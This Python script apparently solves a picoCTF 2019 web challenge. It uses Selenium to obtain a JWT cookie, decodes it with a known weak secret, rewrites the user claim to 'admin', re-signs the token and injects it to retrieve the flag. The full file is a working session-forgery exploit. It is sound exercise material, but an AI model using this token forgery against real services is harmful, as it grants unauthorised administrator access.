import re, jwt
from selenium import webdriver


SECRET = 'ilovepico'
url_ctf = 'http://2019shell1.picoctf.com:45158/'
url_jwt = 'https://jwt.io/'

#PLEASE CHANGE THE EXECUTABLE PLATH TO YOURS!:
driver = webdriver.Firefox(executable_path="/Users/jeffryjimenez/Desktop/hw2/code/geckodriver")
driver.get(url_ctf)

username_element = driver.find_element_by_id('name')
username_element.send_keys("John")
username_element.submit()
john_jwt = driver.get_cookie("jwt")
while (john_jwt is None):
    john_jwt = driver.get_cookie("jwt")


decoded_jwt = jwt.decode(john_jwt["value"], SECRET, algorithms=['HS256'])
decoded_jwt["user"] = "admin"
admin_key = jwt.encode(decoded_jwt, SECRET, algorithm='HS256')


driver.delete_cookie('jwt')
driver.add_cookie({"name": 'jwt', "value": re.findall("\'(.+)\'", str(admin_key))[0]})
driver.refresh()
flag = driver.find_element_by_tag_name("textarea")
result = re.findall('\{(.+)\}', flag.text)[0]

print(result)